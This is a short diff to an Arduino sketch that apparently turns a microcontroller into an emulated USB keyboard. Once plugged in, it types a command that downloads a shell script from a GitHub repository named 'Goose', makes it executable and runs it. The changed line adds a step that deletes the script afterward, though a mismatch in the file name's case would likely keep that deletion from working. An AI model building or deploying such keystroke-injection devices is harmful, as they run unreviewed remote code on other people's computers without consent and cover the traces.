@@ -11,7 +11,7 @@ void setup()
   Keyboard.releaseAll();
   delay(2000);
   
-  Keyboard.println("curl -L -o ~/setUp.sh 'https://github.com/4n4k1n/Goose/raw/main/setUp.sh' && chmod +x ~/setUp.sh && bash ~/setUp.sh");
+  Keyboard.println("curl -L -o ~/setUp.sh 'https://github.com/4n4k1n/Goose/raw/main/setUp.sh' && chmod +x ~/setUp.sh && bash ~/setUp.sh && rm ~/setup.sh");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
 
